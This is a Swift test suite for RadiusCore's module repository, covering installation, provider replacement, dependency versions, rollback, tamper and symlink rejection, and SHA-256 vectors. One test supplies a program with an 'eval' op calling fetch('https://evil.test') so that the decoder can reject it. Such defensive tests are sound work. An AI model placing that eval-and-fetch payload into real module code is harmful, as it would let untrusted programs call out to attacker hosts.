// SPDX-License-Identifier: MPL-2.0
import Foundation
import Testing
@testable import RadiusCore

@Test func officialBehaviorPackagesActuallyExecuteTheirOwnPolicy() throws {
    let notes = try officialProgram("org.radius.notes")
    let created = try notes.run("create", input: ["defaultTitle": .string("Research")])
    #expect(created["title"] == .string("Research"))
    #expect(created["text"] == .string(""))
    let title = try notes.run("update", input: ["field": .string("title"), "value": .string(String(repeating: "é", count: 120))])
    #expect(title["value"]?.string?.count == 100)
    let body = try notes.run("update", input: ["field": .string("text"), "value": .string(String(repeating: "a", count: 200_100))])
    #expect(body["value"]?.string?.count == 200_000)
    let focus = try officialProgram("org.radius.focus")
    #expect(try focus.run("enter", input: ["hideChrome": .bool(false)])["active"] == .bool(false))
    #expect(try focus.run("enter", input: ["hideChrome": .bool(true)])["hiddenComponents"]?.array?.count == 5)
    let capture = try officialProgram("org.radius.screenshot")
    #expect(try capture.run("prepare", input: ["filename": .string("Evidence")])["filename"] == .string("Evidence"))
    #expect(throws: (any Error).self) { try notes.run("unknown", input: [:]) }
}

@Test func behaviorRemovalDeletesItsCodeAndDisabledChoicesSurviveUpdates() throws {
    let directory = temporaryModuleDirectory(); defer { try? FileManager.default.removeItem(at: directory) }
    let repo = try ModuleRepository(root: directory.appendingPathComponent("Modules"))
    var manifest = behaviorManifest("org.test.notes")
    let program = try JSONEncoder().encode(officialProgram("org.radius.notes"))
    try repo.seedDefaults([manifest], payloads: [manifest.id: program])
    #expect(try repo.behaviorProgram(for: manifest.id).run("delete", input: [:])["delete"] == .bool(true))
    try repo.setEnabled(manifest.id, false)
    manifest.version = 3
    try repo.install(manifest, payload: program)
    #expect(try repo.installed().first?.enabled == false)
    #expect(throws: (any Error).self) { try repo.behaviorProgram(for: manifest.id) }
    try repo.uninstall(manifest.id)
    #expect(!FileManager.default.fileExists(atPath: repo.root.appendingPathComponent(manifest.id).appendingPathComponent("program.json").path))
    try repo.seedDefaults([manifest], payloads: [manifest.id: program])
    #expect(try repo.installed().isEmpty)
}

@Test func modifiedOrLinkedProgramsFailClosedAndRemainRepairable() throws {
    let directory = temporaryModuleDirectory(); defer { try? FileManager.default.removeItem(at: directory) }
    let repo = try ModuleRepository(root: directory.appendingPathComponent("Modules"))
    let manifest = behaviorManifest("org.test.notes"), bytes = try JSONEncoder().encode(officialProgram("org.radius.notes"))
    try repo.install(manifest, payload: bytes)
    let path = repo.root.appendingPathComponent(manifest.id).appendingPathComponent("program.json")
    try Data("{}".utf8).write(to: path)
    #expect(try repo.installed().first?.id == manifest.id)
    #expect(throws: (any Error).self) { try repo.behaviorProgram(for: manifest.id) }
    try FileManager.default.removeItem(at: path)
    #expect(try repo.installed().first?.id == manifest.id)
    #expect(throws: (any Error).self) { try repo.behaviorProgram(for: manifest.id) }
    try repo.install(manifest, payload: bytes)
    try FileManager.default.removeItem(at: path)
    try FileManager.default.createSymbolicLink(at: path, withDestinationURL: directory.appendingPathComponent("other"))
    #expect(throws: (any Error).self) { try repo.installed() }
}

@Test func tabProviderReplacementIsExclusiveAndProtectsTheEssentialRole() throws {
    let directory = temporaryModuleDirectory(); defer { try? FileManager.default.removeItem(at: directory) }
    let repo = try ModuleRepository(root: directory.appendingPathComponent("Modules"))
    let standard = ModuleManifest(id: "org.test.standard", name: "Standard", summary: "Standard tabs", capability: .tabSystem, runtime: .declarative)
    var tree = standard; tree.id = "org.test.tree"; tree.name = "Tree"
    try repo.install(standard, payload: Data(#"{"formatVersion":1,"treeTabs":false}"#.utf8))
    try repo.install(tree, payload: Data(#"{"formatVersion":1,"treeTabs":true}"#.utf8))
    #expect(try repo.installed().filter(\.enabled).map(\.id) == [standard.id])
    #expect(throws: (any Error).self) { try repo.setEnabled(standard.id, false) }
    #expect(throws: (any Error).self) { try repo.uninstall(standard.id) }
    try repo.replaceProvider(role: .tabSystem, with: tree.id)
    #expect(try repo.definition(for: tree.id).treeTabs == true)
    try repo.uninstall(standard.id)
    #expect(try ModuleRepository(root: repo.root).installed().filter(\.enabled).map(\.id) == [tree.id])
}

@Test func moduleDependencyVersionsChooseTheExistingNewerCode() throws {
    let directory = temporaryModuleDirectory(); defer { try? FileManager.default.removeItem(at: directory) }
    let repo = try ModuleRepository(root: directory.appendingPathComponent("Modules"))
    var newer = behaviorManifest("org.test.notes"); newer.version = 2
    let bytes = try JSONEncoder().encode(officialProgram("org.radius.notes"))
    try repo.install(newer, enabled: false, payload: bytes)
    var older = newer; older.version = 1
    var dependent = behaviorManifest("org.test.dependent"); dependent.dependencies = [newer.id]; dependent.dependencyVersions = [newer.id: 2]
    let plan = try repo.installationPlan(for: dependent.id, catalog: [older, dependent])
    #expect(plan.map(\.version) == [2, 1])
    #expect(plan.first == newer)
    #expect(try repo.dataPayload(for: newer.id, runtime: .behaviorProgram, requireEnabled: false) == bytes)
    dependent.dependencyVersions = [newer.id: 3]
    #expect(throws: (any Error).self) { try repo.installationPlan(for: dependent.id, catalog: [older, dependent]) }
}

@Test func equalVersionCatalogDriftKeepsInstalledDependencyMetadataAndCode() throws {
    let directory = temporaryModuleDirectory(); defer { try? FileManager.default.removeItem(at: directory) }
    let repo = try ModuleRepository(root: directory.appendingPathComponent("Modules"))
    let a = ModuleManifest(id: "org.test.a", name: "A", summary: "Old dependency", capability: .startWidget, runtime: .declarative)
    var b = behaviorManifest("org.test.b"); b.dependencies = [a.id]
    try repo.install(a, payload: Data(#"{"formatVersion":1,"widgetTitle":"A","widgetBody":"Old dependency"}"#.utf8))
    try repo.install(b, payload: JSONEncoder().encode(officialProgram("org.radius.notes")))
    var c = a; c.id = "org.test.c"; c.name = "C"
    var drifted = b; drifted.dependencies = [c.id]
    let plan = try repo.installationPlan(for: b.id, catalog: [a, c, drifted], includeInstalled: true)
    #expect(plan.map(\.id) == [a.id, b.id])
    #expect(plan.last?.dependencies == [a.id])
    #expect(try repo.installed().first(where: { $0.id == b.id })?.manifest == b)
}

@Test func packageAndProviderTransactionsRollbackFailuresAndRecoverInterruptedOperations() throws {
    let directory = temporaryModuleDirectory(), interrupted = temporaryModuleDirectory()
    defer { try? FileManager.default.removeItem(at: directory); try? FileManager.default.removeItem(at: interrupted) }
    let repo = try ModuleRepository(root: directory.appendingPathComponent("Modules"))
    let standard = ModuleManifest(id: "org.test.standard", name: "Standard", summary: "Tabs", capability: .tabSystem, runtime: .declarative)
    var tree = standard; tree.id = "org.test.tree"; tree.name = "Tree"
    let normalBytes = Data(#"{"formatVersion":1,"treeTabs":false}"#.utf8), treeBytes = Data(#"{"formatVersion":1,"treeTabs":true}"#.utf8)
    try repo.install(standard, payload: normalBytes)
    #expect(throws: (any Error).self) {
        try repo.withAtomicChanges(for: [standard.id, tree.id]) {
            try repo.install(tree, payload: treeBytes)
            try repo.replaceProvider(role: .tabSystem, with: tree.id)
            try repo.uninstall(standard.id)
            // This snapshot is the durable on-disk state of an interrupted app.
            try FileManager.default.copyItem(at: repo.root, to: interrupted)
            throw ValidationError("Simulated late operation failure")
        }
    }
    #expect(try repo.installed().map(\.id) == [standard.id])
    #expect(try repo.definition(for: standard.id).treeTabs == false)
    let recovered = try ModuleRepository(root: interrupted)
    #expect(try recovered.installed().map(\.id) == [standard.id])
    #expect(try recovered.definition(for: standard.id).treeTabs == false)
    #expect(!FileManager.default.fileExists(atPath: interrupted.appendingPathComponent(".batch-transaction.json").path))
    try repo.withAtomicChanges(for: [standard.id, tree.id]) {
        try repo.install(tree, payload: treeBytes); try repo.replaceProvider(role: .tabSystem, with: tree.id); try repo.uninstall(standard.id)
    }
    #expect(try repo.installed().map(\.id) == [tree.id])
    #expect(try repo.definition(for: tree.id).treeTabs == true)
}

@Test func behaviorProviderReplacementIsExplicitAndCannotBreakItsOwnDependencies() throws {
    let directory = temporaryModuleDirectory(); defer { try? FileManager.default.removeItem(at: directory) }
    let repo = try ModuleRepository(root: directory.appendingPathComponent("Modules"))
    let original = behaviorManifest("org.test.notes"), bytes = try JSONEncoder().encode(officialProgram("org.radius.notes"))
    var alternate = original; alternate.id = "org.test.alternative"; alternate.name = "Alternative"
    try repo.install(original, payload: bytes); try repo.install(alternate, payload: bytes)
    #expect(try repo.installed().filter(\.enabled).map(\.id) == [original.id])
    #expect(throws: (any Error).self) { try repo.setEnabled(alternate.id, true) }
    try repo.replaceProvider(role: .notes, with: alternate.id)
    #expect(try repo.installed().filter(\.enabled).map(\.id) == [alternate.id])
    var invalid = original; invalid.id = "org.test.invalid"; invalid.dependencies = [alternate.id]
    try repo.install(invalid, payload: bytes)
    #expect(throws: (any Error).self) { try repo.replaceProvider(role: .notes, with: invalid.id) }
    #expect(try repo.installed().filter(\.enabled).map(\.id) == [alternate.id])
}

@Test func everyOfficialDataPackageHasACompleteCompatibleRemovablePayload() throws {
    let root = officialModuleDirectory("org.radius.notes").deletingLastPathComponent()
    let directories = try FileManager.default.contentsOfDirectory(at: root, includingPropertiesForKeys: nil)
    #expect(directories.count == 18)
    for directory in directories {
        let manifest = try ModuleManifest.decode(Data(contentsOf: directory.appendingPathComponent("manifest.json")))
        if manifest.runtime == .behaviorProgram {
            try ModuleProgram.decode(Data(contentsOf: directory.appendingPathComponent("program.json"))).validate(capability: manifest.capability)
        } else if manifest.runtime == .declarative {
            _ = try ModuleDefinition.decode(Data(contentsOf: directory.appendingPathComponent("definition.json")), capability: manifest.capability)
        } else { #expect(manifest.runtime?.isNative == true) }
    }
    let badTheme = Data(#"{"formatVersion":1,"theme":{"design":"native","colorMode":"light","accent":"blue","density":"comfortable","cornerRadius":10,"transparency":false,"reducedMotion":false,"fontScale":100}}"#.utf8)
    #expect(throws: (any Error).self) { try ModuleDefinition.decode(badTheme, capability: .theme) }
    let lowContrast = Data(##"{"formatVersion":1,"theme":{"design":"native","colorMode":"light","accent":"blue","density":"comfortable","cornerRadius":10,"transparency":false,"reducedMotion":false,"surfaceHex":"#ffffff","textHex":"#eeeeee"}}"##.utf8)
    #expect(throws: (any Error).self) { try ModuleDefinition.decode(lowContrast, capability: .theme) }
    #expect(throws: (any Error).self) { try ModuleDefinition.decode(Data(#"{"formatVersion":1,"icons":{"arbitraryComponent":"bookmark"}}"#.utf8), capability: .icons) }
}

@Test func communityCatalogsNeverInstallCodeOrSpoofReservedWorkers() throws {
    let directory = temporaryModuleDirectory(); defer { try? FileManager.default.removeItem(at: directory) }
    let repo = try ModuleRepository(root: directory.appendingPathComponent("Modules"))
    var manifest = behaviorManifest("org.community.notes")
    let package = DeclarativeModulePackage(manifest: manifest, program: try officialProgram("org.radius.notes"))
    let catalog = DeclarativeModuleCatalog(name: "Community", packages: [package])
    try repo.addCommunityCatalog(catalog, reservedIDs: ["org.radius.reader"])
    #expect(try repo.installed().isEmpty)
    #expect(try repo.communityCatalogs().count == 1)
    manifest.id = "org.radius.reader"
    #expect(throws: (any Error).self) { try repo.addCommunityCatalog(DeclarativeModuleCatalog(name: "Spoof", packages: [DeclarativeModulePackage(manifest: manifest, program: package.program)]), reservedIDs: [manifest.id]) }
    var native = package; native.manifest.capability = .reader; native.manifest.runtime = .nativeReaderWorker
    #expect(throws: (any Error).self) { try native.payload() }
    try repo.install(package.manifest, payload: package.payload())
    try repo.removeCommunityCatalog(named: catalog.name)
    #expect(try repo.installed().count == 1)
    #expect(try repo.communityCatalogs().isEmpty)
}

@Test func moduleSettingsRetainDataByChoiceAndEnforceNativeSchemas() throws {
    let directory = temporaryModuleDirectory(); defer { try? FileManager.default.removeItem(at: directory) }
    let repo = try ModuleRepository(root: directory.appendingPathComponent("Modules"))
    let manifest = try ModuleManifest.decode(Data(contentsOf: officialModuleDirectory("org.radius.notes").appendingPathComponent("manifest.json")))
    let bytes = try JSONEncoder().encode(officialProgram(manifest.id))
    try repo.install(manifest, payload: bytes)
    try repo.setSetting("defaultTitle", value: .string("Working note"), for: manifest.id)
    #expect(throws: (any Error).self) { try repo.setSetting("defaultTitle", value: .bool(true), for: manifest.id) }
    #expect(throws: (any Error).self) { try repo.setSetting("unknown", value: .string("x"), for: manifest.id) }
    try repo.uninstall(manifest.id)
    try repo.install(manifest, payload: bytes)
    #expect(try repo.settings(for: manifest.id)["defaultTitle"] == .string("Working note"))
    try repo.deleteSettings(for: manifest.id)
    #expect(try repo.settings(for: manifest.id)["defaultTitle"] == .string("Untitled note"))
}

@Test func behaviorProgramsRejectDeepUnknownAndExcessiveInstructionsBeforeExecution() throws {
    let deep = Data((String(repeating: "[", count: 1000) + "0" + String(repeating: "]", count: 1000)).utf8)
    #expect(throws: (any Error).self) { try ModuleProgram.decode(deep) }
    #expect(throws: (any Error).self) { try ModuleProgram.decode(Data(#"{"formatVersion":1,"entrypoints":{"run":{"op":"eval","value":"fetch('https://evil.test')"}}}"#.utf8)) }
    let large = ModuleProgram(entrypoints: Dictionary(uniqueKeysWithValues: (0..<17).map { ("event\($0)", ModuleExpression(op: .object, fields: [:])) }))
    #expect(throws: (any Error).self) { try large.validate() }
    var expression = ModuleExpression(op: .literal, value: .string("a"))
    for _ in 0..<20 { expression = ModuleExpression(op: .prefix, limit: 1, arguments: [expression]) }
    #expect(throws: (any Error).self) { try ModuleProgram(entrypoints: ["run": expression]).validate() }
    var incompatible = behaviorManifest("org.test.future"); incompatible.minimumHostVersion = 2
    #expect(throws: (any Error).self) { try incompatible.validate() }
}

@Test func moduleDigestsMatchStandardSHA256VectorsAndPayloadLimit() {
    #expect(ModuleDigest.sha256(Data()) == "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
    #expect(ModuleDigest.sha256(Data("abc".utf8)) == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad")
    #expect(ModuleDigest.sha256(Data("abcdbcdecdefdefgefghfghighijhijkijkljklmklmnlmnomnopnopq".utf8)) == "248d6a61d20638b8e5c026930c3e6039a33ce45964ff2167f6ecedd419db06c1")
    #expect(ModuleDigest.sha256(Data(repeating: 97, count: 8 * 1024 * 1024)) == "ad97f87076920684e2ca66fc44e5d322797dc9d64706b174e51b5d0828937043")
}

private func officialModuleDirectory(_ id: String) -> URL {
    URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
        .appendingPathComponent("Sources/RadiusApp/Resources/Modules/" + id)
}
private func officialProgram(_ id: String) throws -> ModuleProgram { try ModuleProgram.decode(Data(contentsOf: officialModuleDirectory(id).appendingPathComponent("program.json"))) }
private func temporaryModuleDirectory() -> URL { FileManager.default.temporaryDirectory.appendingPathComponent("radius-program-test-" + UUID().uuidString) }
private func behaviorManifest(_ id: String) -> ModuleManifest { ModuleManifest(id: id, name: id, summary: "Constrained program", capability: .notes, runtime: .behaviorProgram) }
